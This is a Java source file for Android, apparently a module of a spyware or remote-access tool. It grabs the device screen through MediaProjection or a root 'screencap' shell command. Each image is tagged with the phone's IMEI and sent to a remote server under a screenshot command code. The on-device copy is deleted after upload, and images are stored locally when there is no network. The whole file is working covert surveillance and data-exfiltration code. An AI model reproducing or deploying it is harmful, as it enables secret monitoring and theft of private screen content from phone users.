package com.phone.data;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.util.Log;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.ref.SoftReference;
import java.nio.ByteBuffer;
import com.main.ForegroundService;
import com.network.Network;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;


public class ScreenSnapshot implements Runnable{
	private static final String TAG = "ScreenSnapshot";
	
	public static final int Max_Image_Requair = 2;
	
	public static final int MAX_WAIT_TIME = 1000;
	
    
    private ImageReader mImageReader;
    private MediaProjection mMediaProjection;
    
    private Context context;
    private final SoftReference<Context> mRefContext;
    
    private VirtualDisplay mVirtualDisplay = null;



    public ScreenSnapshot(Context context, Intent intent) {
    	this.context = context;
        this.mRefContext = new SoftReference<Context>(context);
        mMediaProjection = getMediaProjectionManager().getMediaProjection(Activity.RESULT_OK,intent);
        mImageReader = ImageReader.newInstance(getScreenWidth(),getScreenHeight(),PixelFormat.RGBA_8888,Max_Image_Requair);
    }

    

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private void virtualDisplay() {
        mVirtualDisplay = mMediaProjection.createVirtualDisplay(TAG,getScreenWidth(),getScreenHeight(),
        		Resources.getSystem().getDisplayMetrics().densityDpi,DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
        		mImageReader.getSurface(), null, null);
    }

    
    //You may provide parameter maxImages as 1 for method 
    //ImageReader.newInstance. acquireLatestImage calls acquireNextSurfaceImage before close the only one image buffer, 
    //which lead to this warning.
    //Use acquireNextImage in this case. 
    //If maxImages is bigger than 1, acquireLatestImage don't have this problem.
    @SuppressLint("NewApi") @TargetApi(Build.VERSION_CODES.KITKAT)
    public void run() {
    	try{
    		virtualDisplay();

    		Thread.sleep(Public.SCREENSNAPSHOT_POSTDELAY_TIME);
    		int WaitTime = Public.SCREENSNAPSHOT_POSTDELAY_TIME;
            Image image = mImageReader.acquireLatestImage();
            
            while (image == null) {
            	Thread.sleep(Public.SCREENSNAPSHOT_POSTDELAY_TIME);
            	WaitTime += Public.SCREENSNAPSHOT_POSTDELAY_TIME;
            	if (WaitTime >= MAX_WAIT_TIME) {
            		
                    if (mVirtualDisplay != null) {
                        mVirtualDisplay.release();
                        mVirtualDisplay = null;
                    }

                    if(mMediaProjection != null){
                    	mMediaProjection.stop();
                    	mMediaProjection = null;
                    }
                    
                    WriteDateFile.writeLogFile("ScreenSnapshot time out\r\n");
					return;
				}
            	
            	image = mImageReader.acquireLatestImage();
			}
            
            if (mVirtualDisplay != null) {
                mVirtualDisplay.release();
                mVirtualDisplay = null;
            }

            if(mMediaProjection != null){
            	mMediaProjection.stop();
            	mMediaProjection = null;
            }


            int width = image.getWidth();
            int height = image.getHeight();
            if (width * height * 4 >= Public.VALID_SCREENPHOTO_SIZE) {	//RGBA_8888
                Image.Plane[] planes = image.getPlanes();
                final ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;
                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height,Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                if (bitmap != null) {
                	String filename = PublicFunction.formatCurrentDateInFileName() + "_" + ForegroundService.SCRNSNAPSHOT_FILE_NAME;
    		    	String screenshotfn = ForegroundService.LOCAL_PATH_NAME + filename;
    				if((Network.isNetworkConnected (context) == true)
    						/*&&(Network.getNetworkType(context) == Network.WIFI_CONNECTION*/){

	        			ByteArrayOutputStream baos = new ByteArrayOutputStream();
	        			bitmap.compress(Bitmap.CompressFormat.JPEG, Public.SCREENSNAPSHOT_PHOTO_QUALITY, baos);
	        			byte[] data = baos.toByteArray();
	        			
						int filenamelen = filename.getBytes().length;
						int datasize = (int)data.length;
						int sendsize = datasize + 4 + filenamelen + 4;
						byte[] sendbuf = new byte[sendsize];
						byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
						System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
						System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
						byte[] bytefilesize = PublicFunction.intToBytes(datasize);
						System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
						System.arraycopy(data, 0, sendbuf, 4 + filenamelen + 4, datasize);

	            	    //int bitmapsize = bitmap.getByteCount();
	            	    //ByteBuffer buf = ByteBuffer.allocate(bitmapsize);
	            	    //bitmap.copyPixelsToBuffer(buf);
	            	    //byte[] byteArray = buf.array();
	            	    new Thread(new SendDataToServer(sendbuf, sendsize, Public.CMD_DATA_SCRNSNAPSHOT, Public.IMEI)).start();
    				}else{
	    		    	File fileImage = new File(screenshotfn);
	    		        if (fileImage.exists() == false) {
	    		    		fileImage.createNewFile();
	    	        	}
	    		        
	    		        FileOutputStream out = new FileOutputStream(fileImage,false);
	    		        if (out != null) {
	    		            bitmap.compress(Bitmap.CompressFormat.JPEG, Public.SCREENSNAPSHOT_PHOTO_QUALITY, out);
	    		            out.flush();
	    		            out.close();
	    		        }
    				}

    		        if (bitmap.isRecycled() == false) {
    		            bitmap.recycle();
    		            bitmap = null;
    		        }
                }
                else{
                	WriteDateFile.writeLogFile("ScreenSnapshot get bitmap error\r\n");
                	Log.e(TAG,"ScreenSnapshot get bitmap error");
                }
            }
            else{
            	WriteDateFile.writeLogFile("ScreenSnapshot picture size is too small\r\n");
            	Log.e(TAG,"picture size is too small");
            }
            
            image.close();
        } 
    	catch (Exception ex) {
            ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("startScreenShot run() exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }
    
        return;
    }


    @SuppressLint("InlinedApi") private MediaProjectionManager getMediaProjectionManager() {
        return (MediaProjectionManager) getContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
    }

    private Context getContext() {
        return mRefContext.get();
    }

    private int getScreenWidth() {
        return Resources.getSystem().getDisplayMetrics().widthPixels;
    }

    private int getScreenHeight() {
        return Resources.getSystem().getDisplayMetrics().heightPixels;
    }

    

    
    public static class ScreenCap implements Runnable{
    	
    	private Context context;
    	private static String cmduser = "sh";
    	
    	public ScreenCap(Context context,String user){
    		this.context = context;
    		cmduser = user;
    	}
    	
    	
    	public void run(){
    		shellCommandScreenCap(context);
    	}
    	
    	
    	//root command files must be in sdcard
        public static void shellCommandScreenCap(Context context){
        	try {
            	String filename = PublicFunction.formatCurrentDateInFileName() + "_" + 
            			ForegroundService.SCRNSNAPSHOT_FILE_NAME;
            	String screenfn = ForegroundService.SDCARD_PATH_NAME + filename;	//must be in sdcard
            	int ret = ShellCmd.execShell(cmduser, "screencap -p " + screenfn);
            	if (ret == -1) {
    				return ;
    			}
            	
            	//ret = ShellCmd.execShell(cmduser, "chmod 777 " + screenfn);
        		if((Network.isNetworkConnected (context) == true)
        				/*&&(Network.getNetworkType(context) == Network.WIFI_CONNECTION*/){
        			
        			int filenamelen = filename.getBytes().length;
        			
        			File file = new File(screenfn);
        			int filesize = (int)file.length();		
        		
        			int sendsize = filesize + 4 + filenamelen + 4;
        			byte[] sendbuf = new byte[sendsize];
        			byte[] bytefilenamelen = PublicFunction.intToBytes(filenamelen);
        			System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
        			System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
        			byte[] bytefilesize = PublicFunction.intToBytes(filesize);
        			System.arraycopy(bytefilesize, 0, sendbuf, 4 + filenamelen, 4);
        			
        			FileInputStream fin = new FileInputStream(file);
        			
        			ret = fin.read(sendbuf,4 + filenamelen + 4,filesize);
        			fin.close();
        			new Thread(new SendDataToServer(sendbuf, sendsize, Public.CMD_DATA_SCRNSNAPSHOT, Public.IMEI)).start();

            	    file.delete();
        		}
    		} catch (Exception e) {
    			e.printStackTrace();
    		}

        	return;
        }
    }

}
